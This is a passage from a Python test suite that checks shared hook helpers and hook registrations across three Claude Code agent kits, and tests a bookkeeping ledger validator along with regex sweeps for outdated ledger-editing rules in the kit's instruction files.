    return frozenset(part for part in re.split(r"[|,]", matcher) if part)


def test_shared_helpers_are_identical_across_kits():
    """Three kits ship the same helpers; a drifted copy means one kit enforces differently than
    the others without anyone noticing (the phase-0 disposition lists them as cross-kit copies).

    DERIVED from what is actually shipped in all three, not from a list. The listed version named
    nine files, and everything mirrored after it was written stayed unpinned — including
    `_gate.py`, the one file whose compile decides ~20 gates, plus `gate_push_token`,
    `gate_shell_hygiene`, `kit_trust_state` and five more. `tools/test_hooks.py` carries the same
    rule with the same exception list; this one is the V2 half and asserts the stricter case: a
    name present in ALL THREE kits.

    WHICH names those are is not this test's business and used to be smuggled in as a number: a
    floor of 15 against an actual 19, i.e. four shared helpers could vanish from a kit with the
    suite green. A floor is unfixable in principle — it is either exactly the current value, which
    makes every legitimate divergence red, or it has slack, and the slack is the hole. The two
    tests below say instead what has to BE there, each derived from something that would break if
    the file were missing."""
    from test_hooks import KIT_SPECIFIC_HOOKS
    shared = sorted(set.intersection(*[_hook_files(kit) for kit in KITS])
                    - set(KIT_SPECIFIC_HOOKS))
    for helper in shared:
        bodies = set()
        for kit in KITS:
            with open(os.path.join(TEAM_KITS, kit, "hooks", helper), "rb") as fh:
                bodies.add(fh.read())
        assert len(bodies) == 1, "%s has drifted between kits" % helper


def test_every_kit_ships_the_hook_modules_its_own_hooks_import():
    """The shared helper layer, derived from the IMPORTS instead of counted.

    A helper disappearing from one kit is invisible to every mirror rule in the repo: identity is
    only ever asked of the kits that still ship the file, so removing a copy removes the check
    along with it. What makes the copy necessary is not a list — it is that `_gate.py` imports
    `_audit`, `_root` and `_kernel`, and a gate whose import fails is a gate that cannot run. So
    the question is asked that way round: for every module a kit's own hooks import, if any kit
    ships a hook file by that name, THIS kit must ship it too.

    Parsed with `ast` over the source, so an import mentioned in a docstring is not one and an
    import written inside a function still is."""
    hook_layer = set().union(*[_hook_files(kit) for kit in KITS])
    for kit in KITS:
        shipped = _hook_files(kit)
        checked = set()
        for name in sorted(shipped):
            with open(os.path.join(TEAM_KITS, kit, "hooks", name), encoding="utf-8") as fh:
                tree = ast.parse(fh.read())
            imported = set()
            for node in ast.walk(tree):
                if isinstance(node, ast.Import):
                    imported.update(alias.name.split(".")[0] for alias in node.names)
                elif isinstance(node, ast.ImportFrom) and node.level == 0 and node.module:
                    imported.add(node.module.split(".")[0])
            for module in sorted(imported):
                if module + ".py" in hook_layer:
                    checked.add((name, module + ".py"))
                    assert module + ".py" in shipped, (
                        "%s/hooks/%s imports %s, which no file in that kit provides — the kit's "
                        "own hooks cannot run" % (kit, name, module))
        # ...and the derivation must not be empty FOR THIS KIT. An `ast` walk that finds no local
        # import makes every assertion above vacuous while the test stays green, and the floor that
        # stood here counted across all three kits (`>= len(KITS)` against an actual 166), so two
        # working kits covered for a third whose extraction had stopped matching. Per kit and
        # against emptiness rather than against a number: the property is "this kit's import
        # closure was actually read", which a threshold can only approximate and, with slack,
        # approximates wrongly.
        assert checked, (
            "%s: the `ast` walk found no hook-layer import at all — every statement this test "
            "makes about that kit is vacuous" % kit)


def test_every_registered_hook_script_is_shipped_by_its_kit():
    """A registration is a promise that a file exists; nothing checked that it does.

    This is the other half of what the vanished floor was reaching for. A gate that is registered
    in `settings.json` and absent from `hooks/` produces a hook Claude Code cannot start — silently
    on the enforcement side, since a hook that fails to launch is not a hook that blocks.

    EVERY `.py` THE COMMAND NAMES, which is why this reads `_scripts_in` and not the attribution
    map beside it. `_hook_registrations` deliberately drops `_gate.py` so a registration is credited
    to its gate rather than to the launcher — and while THIS test inherited that exception, the
    launcher was the one file no delivery check covered anywhere: it is imported by nobody (the
    gates are its arguments, not its importers), so the import-closure test does not see it either.
    Deleting `research-team/hooks/_gate.py` left all three checks in this section green and — once
    the VERSION was re-stamped, which is the only thing that noticed — `validate.py` at rc 0, with
    all 29 of that kit's registrations pointing through a file that is not there (measured
    2026-07-28). A command that names a script promises that script, whatever its role in the
    command is."""
    for kit in KITS:
        shipped = _hook_files(kit)
        named = sorted({name for _e, _m, command in _registered_commands(kit)
                        for name in _scripts_in(command)})
        assert named, "no hook registrations found for %s" % kit
        assert GATE_LAUNCHER in named, (
            "%s registers no command through %s — if the launcher is gone this test has stopped "
            "covering it and the exception it was written for needs re-deciding"
            % (kit, GATE_LAUNCHER))
        missing = [name for name in named if name not in shipped]
        assert not missing, "%s registers hooks it does not ship: %s" % (kit, ", ".join(missing))


def test_a_hook_header_names_the_matcher_it_is_actually_registered_under():
    """The `Event(matcher)` a hook's own docstring claims, checked against what registers it.

    SIX HEADERS SAID `PreToolUse(Bash)` while the registration had long been `Bash|PowerShell`
    (measured 2026-07-27, after a round whose fix was to edit the strings — some of them). That is
    what a fix consisting of string edits is worth. The claim is machine-checkable, so it is now
    checked instead:
    the docstring is taken with `ast.get_docstring` (a mention in code or a comment is not a header
    claim), the registration with `_hook_registrations`, and matchers are compared as TOOL SETS so
    that reordering `Edit|Write` is not a failure while dropping a tool is.

    A REGISTERED GATE MUST CLAIM, AND CLAIM COMPLETELY. A header that mentions an event must
    account for every matcher the kit registers that script under for it — `gate_ledger_valid`
    names its two PreToolUse matchers and would be red for naming one.

    The first half of that sentence is not decoration: while a claim was OPTIONAL, deleting the
    parentheses was a cheaper way out of a red than fixing the header, and the repo had already
    taken it — `gate_filing.py` went from `PostToolUse(Edit|Write)` to a bare `PreToolUse —` and
    stopped being checked at all. So the set of scripts that carry a claim is asserted to BE the
    set of scripts the kit registers: a gate cannot leave this test by saying less, and a helper
    that is registered by nobody cannot enter it by mentioning an event in prose. That set is also
    what replaced the floor of `claims_found > 20` (actual: 46) — a number with 26 claims of slack
    says nothing about which claim went missing.

    A registration with NO matcher is claimed as `Event()`, empty parentheses and all, because
    "runs on every call of this event" is a statement and `SessionStart` in a sentence is not.

    The event vocabulary is derived from the registrations too, so an event added to a kit is
    covered without touching this test."""
    for kit in KITS:
        registered = _hook_registrations(kit)
        events = sorted({event for entry in registered.values() for event in entry})
        assert events, "no events registered in %s" % kit
        claim_rx = re.compile(r"\b(%s)\(([^)\n]*)\)" % "|".join(events))
        claiming = set()
        for name in sorted(_hook_files(kit)):
            with open(os.path.join(TEAM_KITS, kit, "hooks", name), encoding="utf-8") as fh:
                docstring = ast.get_docstring(ast.parse(fh.read())) or ""
            claimed = {}
            for event, matcher in claim_rx.findall(docstring):
                claimed.setdefault(event, set()).add(matcher)
            if claimed:
                claiming.add(name)
            for event, matchers in sorted(claimed.items()):
                actual = registered.get(name, {}).get(event, set())
                assert {_tools_in(m) for m in matchers} == {_tools_in(m) for m in actual}, (
                    "%s/hooks/%s says it runs on %s%s, but it is registered on %s — a header that "
                    "names the wrong matcher is read as the contract by everyone who edits the "
                    "hook" % (kit, name, event, sorted(matchers), sorted(actual) or "nothing"))
            # A script that claims one of its events but not the others is half-covered, which the
            # per-event comparison above cannot see: it only ever looks at events the header names.
            assert not claimed or set(claimed) == set(registered.get(name, {})), (
                "%s/hooks/%s names %s in its header but is registered for %s"
                % (kit, name, sorted(claimed), sorted(registered.get(name, {}))))
        assert claiming == set(registered), (
            "%s: these registered gates carry no `Event(matcher)` header (%s), and these files "
            "claim to run somewhere without being registered (%s)"
            % (kit, sorted(set(registered) - claiming) or "none",
               sorted(claiming - set(registered)) or "none"))


# -- the lead instruction package (spec II.5) ---------------------------------

def test_the_shipped_lead_packages_are_within_their_own_record():
    """spec II.5 names this budget FIRST and for three releases it was the one check that could
    only WARN — on the argument that phase 2 must not fail its own build on work phase 3 owns.
    Measured across those releases: all three kits stayed over it, the warning was read and
    stepped over every time, and II.11/3 kept promising to make it hard "later". Since 2026-08-03
    the ceiling is the recorded measurement per kit, so the rule starts satisfied and is a hard
    failure on the next byte.

    WHAT THIS TEST MEASURES, and it is deliberately the smaller half: the SHIPPED tree, through the
    real `validate.py` process. Every package is inside its own record, so the run reports none of
    them, and the record is the size of the two files that were measured to load.

    WHAT IT DOES NOT MEASURE, said here because the obvious wording would claim it: that the size
    rule FAILS rather than warns. Over a tree that is within its record, a `fails.append` and a
    `print("[warn] …")` produce the same silence — measured, this test stays green with the rule
    reverted. The channel is measured where the rule can fire, on a copy one byte over its record
    (`test_context_budget.py::test_a_lead_package_over_its_record_fails_with_the_two_figures_it_compared`,
    which asserts the complaint appears on the FAILURE channel). Asserting "no `[warn]` at all"
    here is worth one thing only: some OTHER check reintroducing the channel is visible."""
    import subprocess as sp
    result = sp.run([sys.executable, os.path.join(ROOT, "tools", "validate.py")],
                    capture_output=True, text=True, cwd=ROOT)
    output = result.stdout + result.stderr
    assert "[warn]" not in output, (
        "validate.py warns again — every check it runs is either a failure or not a check:\n%s"
        % output)
    reported = [line for line in output.splitlines() if "lead instruction package" in line]
    assert not reported, (
        "a shipped kit is outside its own recorded size. Shorten it, or raise the record with a "
        "reason (python tools/record_lead_package_sizes.py --write --note \"...\"):\n%s"
        % "\n".join(reported))
    # ...and the record really covers what the derivation weighs, so "nothing reported" cannot mean
    # "nothing was weighed": every kit has a ceiling and it is the size of the files that LOAD.
    sys.path.insert(0, os.path.join(ROOT, "tools"))
    import lead_package
    for kit in KITS:
        kit_dir = os.path.join(TEAM_KITS, kit)
        weighed = [os.path.relpath(path, kit_dir).replace(os.sep, "/")
                   for path in lead_package.files(kit_dir)]
        assert weighed == ["constitution/AGENTS.md",
                           "agents/%s.md" % lead_package.lead_role(kit_dir)], (kit, weighed)
        assert lead_package.ceiling(kit_dir) == lead_package.size(kit_dir), kit
        assert not set(lead_package.on_demand_files(kit_dir)) & set(lead_package.files(kit_dir)), (
            "%s: the lead SKILL is registered on demand and must not be in the weighed set" % kit)


def test_validate_py_is_green():
    """A green pytest run is not a green build, and no test in this repo ever said otherwise.

    `tools/validate.py` is the second half of the gate — it checks the things a unit test cannot
    see: that every input the kit hash covers is git-tracked, that no kit was edited without a
    VERSION bump, that no bytecode was left in a tree the installer copies. All of that lived
    outside the suite, so "1200 passed" and "this commit installs" were separate claims and only
    the first one was ever made. Worse, the coupling ran the wrong way: a forgotten
    `bump_kit_version.py` was announced by a dozen unrelated tests failing with a message about
    kit hashes, and by nothing that names validate.

    RUN, not imported: the exit code is the deliverable, and a function call cannot produce one."""
    result = subprocess.run([sys.executable, os.path.join(ROOT, "tools", "validate.py")],
                            capture_output=True, text=True, cwd=ROOT)
    assert result.returncode == 0, (
        "tools/validate.py fails — the tree does not install as it stands:\n"
        + result.stdout + result.stderr)
    # THE EXIT CODE IS THE WHOLE ASSERTION, and since 2026-08-03 that is all there is to assert:
    # validate.py has no warning channel left, so "which channel did this finding come out of" is
    # no longer a question about this program — every finding is a failure or it is not a finding.
    # The one check that used to have a channel is followed in
    # `test_the_shipped_lead_packages_are_within_their_own_record` and, for the case where it can
    # actually fire, in `test_context_budget.py`.


# -- the validation core: one implementation, two callers ---------------------

def ledger_project(tmp_path, rows=""):
    os.makedirs(str(tmp_path / "scripts"), exist_ok=True)
    os.makedirs(str(tmp_path / "ledger"), exist_ok=True)
    shutil.copy(os.path.join(OFFICE_SCRIPTS, "ledger_add.py"),
                str(tmp_path / "scripts" / "ledger_add.py"))
    if rows:
        write(str(tmp_path / "ledger" / "2026.csv"), LEDGER_COLS + rows)
    return tmp_path


def validate(tmp_path, rel="ledger/2026.csv"):
    return subprocess.run([sys.executable, str(tmp_path / "scripts" / "ledger_add.py"),
                           "--validate", rel],
                          capture_output=True, text=True, cwd=str(tmp_path), timeout=60)


def book(tmp_path, **over):
    args = {"--year": "2026", "--direction": "expense", "--doc-type": "invoice",
            "--doc-date": "2026-01-05", "--payment-date": "2026-01-07", "--counterparty": "ACME",
            "--net": "100.00", "--vat-rate": "19", "--gross": "119.00",
            "--vat-treatment": "standard", "--category": "tools", "--source": "archive/a.pdf"}
    args.update(over)
    argv = [str(tmp_path / "scripts" / "ledger_add.py")]
    for key, value in args.items():
        if value is not None:
            argv += [key, value]
    return subprocess.run([sys.executable] + argv, capture_output=True, text=True,
                          cwd=str(tmp_path), timeout=60)


@pytest.mark.parametrize("amount", ["nan", "inf", "-inf", "NaN", "Infinity"])
def test_a_non_finite_amount_is_refused(tmp_path, amount):
    """`float("nan")` succeeds, and `nan` then compares False against every threshold — so the
    arithmetic check PASSED and the value flowed into `euer_report.py`, which prints the quarter's
    totals as `nan` in a document that goes to a tax office."""
    row = ("L2026-0001,2026-01-05,2026-01-07,expense,invoice,ACME,R-1,%s,0.00,%s,exempt,tools,"
           "archive/a.pdf,,\n" % (amount, amount))
    ledger_project(tmp_path, row)
    result = validate(tmp_path)
    assert result.returncode == 1
    assert "finite" in result.stderr or "not a number" in result.stderr


def test_a_comma_decimal_is_refused(tmp_path):
    """`euer_report.py` parses with a bare `float()`. Accepting "100,00" here meant a ledger that
    validated clean and a report that crashed — a validator must not accept what its consumer
    cannot read."""
    row = ('L2026-0001,2026-01-05,2026-01-07,expense,invoice,ACME,R-1,"100,00",0.00,"100,00",'
           'exempt,tools,archive/a.pdf,,\n')
    ledger_project(tmp_path, row)
    result = validate(tmp_path)
    assert result.returncode == 1
    assert "comma decimal" in result.stderr


def test_a_bom_is_named_rather_than_reported_as_a_header_change(tmp_path):
    """A BOM makes the first column `\ufeffid`, so every `row["id"]` in the reports misses. As a
    header mismatch it reads as "someone renamed a column" and sends the fix the wrong way."""
    ledger_project(tmp_path, GOOD_ROW)
    path = str(tmp_path / "ledger" / "2026.csv")
    with open(path, "rb") as fh:
        body = fh.read()
    with open(path, "wb") as fh:
        fh.write(b"\xef\xbb\xbf" + body)
    result = validate(tmp_path)
    assert result.returncode == 1
    assert "BOM" in result.stderr


def test_a_reversal_of_a_reversal_is_refused(tmp_path):
    """`euer_report.py` sums every reversal with sign -1. Reversing a reversal therefore subtracts
    twice: a booked-and-reversed 119 EUR expense reported as -119 EUR, and nothing downstream had
    any reason to suspect its input."""
    rows = (GOOD_ROW
            + "L2026-0002,2026-02-05,2026-02-07,expense,reversal,ACME,R-1,100.00,19.00,119.00,"
              "standard,tools,archive/a.pdf,L2026-0001,\n"
            + "L2026-0003,2026-03-05,2026-03-07,expense,reversal,ACME,R-1,100.00,19.00,119.00,"
              "standard,tools,archive/a.pdf,L2026-0002,\n")
    ledger_project(tmp_path, rows)
    result = validate(tmp_path)
    assert result.returncode == 1
    assert "itself a reversal" in result.stderr


def test_one_entry_cannot_be_reversed_twice(tmp_path):
    """Same arithmetic, different shape: two reversals of one original subtract it twice."""
    rev = ("L2026-000%d,2026-0%d-05,2026-0%d-07,expense,reversal,ACME,R-1,100.00,19.00,119.00,"
           "standard,tools,archive/a.pdf,L2026-0001,\n")
    ledger_project(tmp_path, GOOD_ROW + rev % (2, 2, 2) + rev % (3, 3, 3))
    result = validate(tmp_path)
    assert result.returncode == 1
    assert "already reversed" in result.stderr


def test_a_legitimate_reversal_still_passes(tmp_path):
    """The counterpart that keeps the graph rules from banning the sanctioned correction flow."""
    ledger_project(tmp_path, GOOD_ROW
                   + "L2026-0002,2026-02-05,2026-02-07,expense,reversal,ACME,R-1,100.00,19.00,"
                     "119.00,standard,tools,archive/a.pdf,L2026-0001,\n")
    assert validate(tmp_path).returncode == 0


def test_a_reversal_must_name_its_target(tmp_path):
    """The append path required it and the file check did not — so `--validate` called a ledger
    clean that the script itself could never have produced. That IS the drift the shared core was
    supposed to make impossible."""
    ledger_project(tmp_path, GOOD_ROW.replace("expense,invoice", "expense,reversal"))
    result = validate(tmp_path)
    assert result.returncode == 1
    assert "must name the entry it reverses" in result.stderr


@pytest.mark.parametrize("over,needle", [
    ({"--net": "nan", "--gross": "nan"}, "finite"),
    ({"--doc-type": "reversal"}, "must name the entry it reverses"),
    ({"--payment-date": "2025-01-07"}, "does not belong"),
    ({"--net": "100.00", "--gross": "150.00"}, "!= gross"),
])
def test_the_append_path_refuses_exactly_what_validate_refuses(tmp_path, over, needle):
    """One core, two callers. Two implementations had already drifted in three ways, and every
    drift is a row the script writes and its own validator then rejects."""
    ledger_project(tmp_path)
    result = book(tmp_path, **over)
    assert result.returncode == 1
    assert needle in result.stderr


def test_the_append_path_writes_the_whole_file_atomically(tmp_path):
    """Disposition row 310: "Validierender Edit-/Importpfad vor atomarer Speicherung". An append
    into the live file leaves half a row if the process dies, and the next `--validate` then
    reports a broken ledger that no edit caused."""
    ledger_project(tmp_path)
    assert book(tmp_path, **{"--invoice-no": "R-1"}).returncode == 0
    assert book(tmp_path, **{"--invoice-no": "R-2"}).returncode == 0
    assert validate(tmp_path).returncode == 0
    body = open(str(tmp_path / "ledger" / "2026.csv"), encoding="utf-8").read()
    assert body.count("\n") == 3 and body.startswith("id,doc_date")
    assert not [f for f in os.listdir(str(tmp_path / "ledger")) if f.startswith(".")]


def test_an_invalid_import_writes_nothing(tmp_path):
    """The import validates the MERGED result before saving, so a bad batch cannot land half in."""
    ledger_project(tmp_path, GOOD_ROW)
    before = open(str(tmp_path / "ledger" / "2026.csv"), encoding="utf-8").read()
    write(str(tmp_path / "rows.csv"), LEDGER_COLS
          + ",2026-05-01,2026-05-02,income,invoice,X,AR-1,100.00,19.00,999.00,standard,s,a.pdf,,\n")
    result = subprocess.run([sys.executable, str(tmp_path / "scripts" / "ledger_add.py"),
                             "--import", "rows.csv", "--year", "2026"],
                            capture_output=True, text=True, cwd=str(tmp_path), timeout=60)
    assert result.returncode == 1
    assert open(str(tmp_path / "ledger" / "2026.csv"), encoding="utf-8").read() == before


def test_a_valid_import_lands_and_validates(tmp_path):
    ledger_project(tmp_path, GOOD_ROW)
    write(str(tmp_path / "rows.csv"), LEDGER_COLS
          + ",2026-05-01,2026-05-02,income,invoice,X,AR-1,100.00,19.00,119.00,standard,s,a.pdf,,\n")
    result = subprocess.run([sys.executable, str(tmp_path / "scripts" / "ledger_add.py"),
                             "--import", "rows.csv", "--year", "2026"],
                            capture_output=True, text=True, cwd=str(tmp_path), timeout=60)
    assert result.returncode == 0, result.stderr
    assert validate(tmp_path).returncode == 0
    assert "L2026-0002" in open(str(tmp_path / "ledger" / "2026.csv"), encoding="utf-8").read()


def test_validate_is_a_mode_only_in_first_position(tmp_path):
    """"--validate anywhere in argv" turned `--note "see --validate"` into a validation run of the
    note text: the append never happened and the operator watched it exit 0."""
    ledger_project(tmp_path)
    result = book(tmp_path, **{"--note": "compare with --validate output", "--invoice-no": "R-1"})
    assert result.returncode == 0, result.stderr
    assert "appended" in result.stdout
    assert "L2026-0001" in open(str(tmp_path / "ledger" / "2026.csv"), encoding="utf-8").read()


# The append-only rule was ABOLISHED (user decision V2 I.3/1), and these are the phrasings that
# still teach it. Written as SEMANTIC patterns, not as the exact strings that were fixed: a needle
# list built from the corrections it was written after can only confirm those corrections. Two
# rounds of this test missed real files for that reason, and the second time the reviewer proved it
# by re-planting both regressions and watching the test stay green.
STALE_LEDGER_TEACHING = (
    r"guard_ledger_direct",                       # the hook this phase deleted
    r"append[- ]only\s*(?:`?ledger|writes)",       # "append-only ledger", "append-only writes"
    r"ledger\s+is\s+(?:script-)?append",
    r"never\s+edit[s]?\s+`?ledger",               # "never edit ledger/*.csv", "never edits"
    r"NEVER\s+edit",                              # the shouted form, in any casing
    r"ledger/\*\.csv[^.\n]{0,40}(?:blocked|guarded|script-only|forbidden)",
    r"[Cc]orrections\s*=\s*reversal\s+entries,\s*never\s+edits",
    r"direct\s+.{0,20}edits?\s+are\s+blocked",
)


# The CURRENT rule, in the phrasings a shipped file may legitimately use to state it. A file that
# tells the agent how ledger writes work must contain one of these — otherwise it is describing the
# rule from before I.3/1, in words nobody anticipated.
# Each marker has to be ABOUT the ledger. A bare `r"ALLOWED"` compiled IGNORECASE was satisfied by
# any "allowed" anywhere in the file, so "Never edit `ledger/*.csv` by hand. Reading the archive is
# allowed." passed — the positive check was close to vacuous on its own, and its one real find came
# from the SCOPE test rather than from the marker list.
CURRENT_LEDGER_RULE = (
    r"ledger[^\n]{0,80}\bALLOWED\b",
    r"\bALLOWED\b[^\n]{0,80}ledger",
    r"edit[^\n]{0,40}\bis ALLOWED\b",
    r"allowed and (?:is )?(?:ALWAYS )?(?:re-)?validat",
    r"re-validat",
    r"always-validated",
    r"validation-required",
    r"I\.3/1",
)
# ...and the files that DO discuss writing the ledger, which is what makes the positive check
# decidable: a file merely mentioning `ledger/` in passing is not making a claim about editing it.
_LEDGER_WRITE_TALK = re.compile(
    r"ledger[^\n]{0,80}\b(?:edit|write|hand|direkt|directly|bearbeit)"
    r"|\b(?:edit|write|hand|directly)[^\n]{0,80}ledger", re.IGNORECASE)
# ...but a ROLE SCOPE line is a different rule and stays true. "never touches ledger,
# project_memory YAMLs or kit scripts" enumerates one role's boundary across several trees; it
# makes no claim about how ledger writes are governed, and I.3/1 widened nobody's write scope.
# The giveaway is the ENUMERATION — the ledger named beside project_memory or scripts — plus the
# absence of any mechanism claim. The positive check flagged this on its first run, which is
# exactly its value: a denylist would have mis-handled the same file in the other direction,
# silently, forever.
_ROLE_SCOPE_TALK = re.compile(
    r"(?:never|nie|no)[^\n]{0,40}\b(?:touch|mutate|write)[^\n]{0,60}ledger[^\n]{0,80}"
    r"(?:project_memory|scripts)", re.IGNORECASE)
# Each of these has to be ABOUT the ledger. A first cut accepted a bare "by hand", which also
# matches "check the figure against the source by hand" — an instruction to be careful, not a
# claim about write mechanics.
_MECHANISM_WORDS = r"reversal|by hand|read-only|not permitted|are refused|hand edits?"
_WRITE_MECHANISM_TALK = re.compile(
    r"script-only|append-only|ledger_add"
    r"|ledger[^\n]{0,60}(?:" + _MECHANISM_WORDS + r")"
    r"|(?:" + _MECHANISM_WORDS + r")[^\n]{0,60}ledger",
    re.IGNORECASE)


# A PROHIBITION on editing the ledger, by SHAPE rather than by wording: a negation, an editing
# verb and the ledger, inside one sentence. This is not the denylist that failed three times —
# that one enumerated the exact historical strings and could only ever recognise phrasings someone
# had already seen. Any prohibition has to contain these three parts, whatever words carry them.
# `cannot` matters as its own word: `\bnot\b` does not match inside it. The German set and
# `altered|touched|immutable` came from a reviewer round that planted fourteen shapes the first
# calibration missed -- passive voice being the most natural way a policy line is actually written.
_NEGATION = (r"not|never|no|refused|forbidden|prohibited|cannot|can't|must only|only be"
             r"|verboten|untersagt|nicht|nie|kein|ausschliesslich|ausschließlich")
# The German forms need their INFLECTIONS spelled out: `\bbearbeit\b` does not match "bearbeitet"
# (the trailing word boundary), and "Änderungen" is the verb-noun a German policy line uses.
_EDIT_VERB = (r"edit|edits|edited|editing|write|writes|written|writing|modify|modified|alter"
              r"|altered|touched|changed|bearbeitet|bearbeiten|bearbeitung"
              r"|geaendert|geändert|aenderung(?:en)?|änderung(?:en)?")
# The negation must be ADJACENT to the verb, hence a filler class instead of `.{0,60}`. At 60
# characters of anything, "Do not invent values when editing the ledger" read as a prohibition on
# editing (it forbids INVENTING), and so did "Never edit a generated report; the ledger is the
# source of truth" (it forbids editing the REPORT). Five of ten ordinary correct sentences were
# flagged, two of them the kit's own doctrine — and a check that reddens the build on correct text
# gets switched off, after which it protects nothing.
_FILL = r"[\w\s`'\"*/.-]"
_LEDGER_PROHIBITION = re.compile(
    r"\b(?:%s)\b%s{0,15}?\b(?:%s)\b[^\n]{0,30}?ledger" % (_NEGATION, _FILL, _EDIT_VERB)
    + r"|ledger[^\n]{0,25}?\b(?:%s)\b%s{0,15}?\b(?:%s)\b" % (_EDIT_VERB, _FILL, _NEGATION)
    # 25, not 15: "Änderungen an `ledger/*.csv` sind untersagt" needs room for the German
    # preposition and the backtick before the path
    + r"|\b(?:%s)\b%s{0,25}?ledger[^\n]{0,25}?\b(?:%s)\b" % (_EDIT_VERB, _FILL, _NEGATION)
    # ...and "NO direct ledger writes", where the negation precedes the noun and the verb follows
    + r"|\b(?:%s)\b%s{0,20}?ledger%s{0,12}?\b(?:%s)\b" % (_NEGATION, _FILL, _FILL, _EDIT_VERB)
    # PASSIVE VOICE: "The ledger may not be edited by hand." The subject comes first, then the
    # negation, then the verb -- the one ordering the three original alternations all missed, and
    # the one a policy sentence most naturally uses.
    + r"|ledger%s{0,30}?\b(?:%s)\b%s{0,20}?\b(?:%s)\b" % (_FILL, _NEGATION, _FILL, _EDIT_VERB),
    re.IGNORECASE)
# ...and the shapes with no verb at all, which a three-part rule cannot reach by construction:
# a table cell, a bullet fragment, a German "ausschliesslich ueber das Skript".
_LEDGER_TERSE_RX = re.compile(
    r"ledger[^\n]{0,60}\b(?:script only|script-only|hands off|immutable|manual edits?)"
    r"|\b(?:script only|script-only|hands off|no manual)[^\n]{0,40}ledger"
    r"|ledger[^\n]{0,40}\bausschlie(?:ss|ß)lich\b", re.IGNORECASE)
# The correction-flow prohibition names no ledger at all — "Corrections = reversal entries, never
# edits." is about the ledger by context, and it was one of the four shipped defects.
_CORRECTION_PROHIBITION = re.compile(
    r"\breversal[^\n]{0,40}\b(?:never|not|no)\b[^\n]{0,10}\b(?:edit|edits)\b"
    r"|\b(?:never|not|no)\b[^\n]{0,10}\b(?:edit|edits)\b[^\n]{0,40}\breversal", re.IGNORECASE)
# A DEFINITION is not a prohibition: "a reversal is not an edit of the ledger row" explains what a
# reversal IS, and it is exactly the distinction the kit exists to teach. A real prohibition is
# imperative ("do not edit") or passive ("edits are refused"), never a copula plus an article.
_DEFINITION_RX = re.compile(r"\bis\s+not\s+(?:an?|the)\s+(?:edit|write|change)\b", re.IGNORECASE)
# ...plus the phrasings that ARE the prohibition and need no verb: "the ledger is read-only",
# "script-only", "EXCLUSIVELY through the script". The three-part shape above misses these because
# there is nothing to negate — the noun carries it. Found by planting the reviewer's fourth
# paraphrase, which the three-part rule let through.
# A COPULA is required, so the property is predicated of the LEDGER and not of a role: "READ-ONLY
# daily reviewer … samples filing/ledger" describes the auditor and stays true. Without it the
# check flagged two correct role descriptions on the clean tree — the same class of false positive
# the role-scope exemption above exists for.
# `[^\n]`, not `[^\n.]`: the bound was meant to stop at a sentence boundary, but a FILENAME
# contains a dot, so ``ledger/*.csv` is read-only`` never matched its own subject.
_LEDGER_CLOSED_RX = re.compile(
    r"ledger[^\n]{0,40}\b(?:is|are|stays?|remains?|bleibt)\b[^\n]{0,25}"
    r"\b(?:read-only|script-only|append-only)\b"
    r"|\bledger[^\n]{0,40}\bexclusively through\b", re.IGNORECASE)


def ledger_prohibitions(body):
    """Clauses that forbid editing the ledger. Empty for a file that is fine.

    CLAUSE by clause, not file by file, and with two precision rules that a first cut lacked —
    it flagged five ordinary correct sentences, including the kit's own doctrine:

      * the negation and the editing verb must be ADJACENT. "Do not invent values when editing the
        ledger" negates *inventing*, and "Never edit a generated report; the ledger is the source
        of truth" negates editing the REPORT.
      * a clause that also states the current rule is not a contradiction. "You may edit the
        ledger, but never without re-validating afterwards" IS the current rule, with a caveat.

    Clause boundaries are `;`, `—` and sentence ends, because the false positives were mostly one
    correct statement sitting next to an unrelated negation.
    """
    current = [re.compile(p, re.IGNORECASE) for p in CURRENT_LEDGER_RULE]
    found = []
    for line in body.splitlines():
        for clause in re.split(r"(?<=[.;])\s+|\s+—\s+|\s+--\s+", line):
            if not clause.strip():
                continue
            if any(p.search(clause) for p in current) or _DEFINITION_RX.search(clause):
                continue
            for rx in (_LEDGER_PROHIBITION, _LEDGER_CLOSED_RX, _CORRECTION_PROHIBITION,
                       _LEDGER_TERSE_RX):
                hit = rx.search(clause)
                if hit:
                    found.append(clause.strip())
                    break
    return found


def test_the_contradiction_sweep_does_not_flag_correct_sentences():
    """The false-positive surface, pinned. Five of these were flagged by the first cut — including
    "A reversal is not an edit of the ledger row", which is the distinction the kit exists to
    teach, and "Do not invent values when editing the ledger", which is its UNCLEAR doctrine.
    A check that reddens the build on correct text gets disabled, and then it protects nothing."""
    fine = [
        "A reversal is not an edit of the ledger row; it is a new entry.",
        "You may edit the ledger, but never without re-validating afterwards.",
        "Do not invent values when editing the ledger — an unreadable field is UNCLEAR.",
        "Never edit a generated report; the ledger is the source of truth.",
        "Do not delete rows; edit the ledger only with a note in the Evidence.",
        "A direct `ledger/*.csv` edit is ALLOWED and triggers full-file validation.",
        "READ-ONLY daily reviewer — samples filing/ledger claims against the artifacts.",
        "Never edit provider settings, hooks or generated reports.",
        "`ledger_add.py` is the normal write path; a direct edit is re-validated in full.",
        "The bookkeeper writes the ledger CONTENT via `ledger_add.py`.",
    ]
    flagged = [(text, ledger_prohibitions(text)) for text in fine]
    assert [t for t, hits in flagged if hits] == [], flagged


def test_the_contradiction_sweep_still_catches_a_real_prohibition():
    """The counterpart, so the precision rules above cannot decay into "flags nothing"."""
    stale = [
        "Do not edit `ledger/*.csv` by hand; book through the script.",
        "Hand edits to the ledger are refused.",
        "`ledger/*.csv` is read-only for agents.",
        "Editing the ledger directly is not permitted.",
        "NO direct ledger writes, like everyone.",
        "Corrections = reversal entries, never edits.",
    ]
    missed = [text for text in stale if not ledger_prohibitions(text)]
    assert missed == [], missed


def test_no_shipped_file_states_both_ledger_rules():
    """The shape both other sweeps miss: a file that carries the CURRENT rule and a prohibition.

    The denylist looks for known stale strings; the positive check requires the current rule to be
    present. A paraphrased prohibition added BESIDE the correct sentence satisfies both — and that
    is the realistic regression, because nobody deletes the new rule when re-adding the old one,
    they just append a line. Verified against the four paraphrases the reviewer planted, each of
    which passed the other two sweeps.

    Matched by SHAPE (negation + editing verb + ledger, in one sentence) rather than by wording,
    because a prohibition must contain all three parts however it is phrased.
    """
    office = os.path.join(TEAM_KITS, "office-team")
    contradictions = []
    for directory, subdirs, files in os.walk(office):
        subdirs[:] = [d for d in subdirs if d not in (".git", "__pycache__")]
        for name in files:
            if not name.endswith((".md", ".yaml", ".yml", ".txt")):
                continue
            path = os.path.join(directory, name)
            body = open(path, encoding="utf-8", errors="ignore").read()
            for clause in ledger_prohibitions(body):
                contradictions.append("%s: %r" % (os.path.relpath(path, TEAM_KITS), clause[:90]))
    assert contradictions == [], (
